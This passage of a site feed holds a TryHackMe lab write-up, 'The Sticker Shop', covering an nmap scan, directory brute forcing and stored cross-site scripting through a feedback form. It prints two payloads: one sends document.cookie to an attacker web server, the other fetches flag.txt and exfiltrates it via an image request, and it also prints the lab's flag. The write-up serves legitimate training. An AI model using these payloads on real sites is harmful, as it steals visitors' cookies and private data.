+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.1 Python/3.8.10
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">04</span> Dec <span style="color:#ae81ff">2024</span> 22:38:16 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">1655</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Cat Sticker Shop&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;style&gt;
+</span></span><span style="display:flex;"><span>|     body <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     font-family: Arial, sans-serif;
+</span></span><span style="display:flex;"><span>|     margin: 0;
+</span></span><span style="display:flex;"><span>|     padding: 0;
+</span></span><span style="display:flex;"><span>|     header <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     background-color: <span style="color:#75715e">#333;</span>
+</span></span><span style="display:flex;"><span>|     color: <span style="color:#75715e">#fff;</span>
+</span></span><span style="display:flex;"><span>|     text-align: center;
+</span></span><span style="display:flex;"><span>|     padding: 10px;
+</span></span><span style="display:flex;"><span>|     header ul <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     list-style: none;
+</span></span><span style="display:flex;"><span>|     padding: 0;
+</span></span><span style="display:flex;"><span>|     header li <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     display: inline;
+</span></span><span style="display:flex;"><span>|     margin-right: 20px;
+</span></span><span style="display:flex;"><span>|     header a <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     text-decoration: none;
+</span></span><span style="display:flex;"><span>|     color: <span style="color:#75715e">#fff;</span>
+</span></span><span style="display:flex;"><span>|     font-weight: bold;
+</span></span><span style="display:flex;"><span>|     .content <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>|     padding: 20px;
+</span></span><span style="display:flex;"><span>|_    .product <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8080-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/4%Time<span style="color:#f92672">=</span>6750D9D8%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>GetRequest,726,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Python/3\.8\.10\r\nDate:\x20Wed,\x2004\x20Dec\x202024\x2022:38:16\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x201655\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;he
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ad&gt;\n\x20\x20\x20\x20&lt;title&gt;Cat\x20Sticker\x20Shop&lt;/title&gt;\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20{\n\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#333;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20ul
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20list-style:\x20n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:one;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20heade
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\x20li\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20inline;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-righ
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:t:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20header\x20a\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20text-decoration:\x20none;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\.content\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20padding:\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20\x20\x20\.product\x20{\n\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20bo&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 113.37 seconds
+</span></span></code></pre></div><p>We find two open ports: 22 (SSH) and 8080 (http).</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>At <code>http://stickershop.thm:8080/</code> we discover a cat sticker shop website.</p>
+<p><img src="/images/THM-The_Sticker_Shop/stickershop_website.png" alt="The sticker shop website"></p>
+<p>Clicking on the <code>Feeback</code> leads to <code>http://stickershop.thm:8080/submit_feedback</code>, a section for customer feedback.</p>
+<p><img src="/images/THM-The_Sticker_Shop/stckershop_feedback.png" alt="The sticker shop feedback section"></p>
+<p>The page source code does not have anything interesting. Trying to directly read the flag at <code>http://10.10.139.96:8080/flag.txt</code> returns a <code>401 Unauthorized</code> error.</p>
+<p><img src="/images/THM-The_Sticker_Shop/flag_401.png" alt="flag read fail"></p>
+<p>After running some directory brute forcing with gobuster we find a <code>/view_feedback</code> directory which we cannot access.</p>
+<p><img src="/images/THM-The_Sticker_Shop/gobuster_stickershop.png" alt="gobuster directory brute forcing"></p>
+<p><img src="/images/THM-The_Sticker_Shop/stickershop_view_feedback.png" alt="stickershop view feedback"></p>
+<h3 id="xss-exploitation-to-obtain-the-flag">XSS Exploitation to Obtain the flag</h3>
+<p>The hint tells us that we need to use some client-side exploitation in order to read the flag, so we will try Cross-Site Scripting (XSS).</p>
+<p>Let&rsquo;s start with a test, we start a web server on our local machine and send the payload at <code>http://stickershop.thm:8080/submit_feedback</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://WEBSERVER_IP/?cookie=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><img src="/images/THM-The_Sticker_Shop/XSS_payload_sent.png" alt="XSS payload test"></p>
+<p>After submitting the payload we get some responses on our web server, confirming the XSS vulnerability.</p>
+<p><img src="/images/THM-The_Sticker_Shop/xss_confirm.png" alt="XSS confirmation"></p>
+<p>We already know that the flag is at <code>http://10.10.139.96:8080/flag.txt</code>, so we can use a modified script in order to receive it on our web server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://127.0.0.1:8080/flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">img</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">img</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://WEBSER_IP:PORT/?data=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">img</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p><img src="/images/THM-The_Sticker_Shop/flag_fetching.png" alt="payload to receiver flag.txt"></p>
+<p><img src="/images/THM-The_Sticker_Shop/flag_on_webserver.png" alt="flag on webser"></p>
+<p>We obtain the value of <code>flag.txt</code> with the curly brackets encoded. The decoded value is</p>
+<pre tabindex="0"><code>THM{83789a69074f636f64a38879cfcabe8b62305ee6}
+</code></pre><p>TryHackMe has an excellent room to learn about all sort of XSS vulnerabilities (reflected, stored, DOM-based), you can find it <a href="https://tryhackme.com/r/room/axss" target="_blank" >here</a>
+
+.</p>
+<p>If you need a list of payloads for XSS, you can go to the <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" >Cross-site scripting (XSS) cheat sheet</a>
+
+ from PortSwigger or <a href="https://github.com/djalilayed/tryhackme/blob/main/The%20Sticker%20Shop/payload.js" target="_blank" >this Github repo</a>
+
+.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Resource</title>
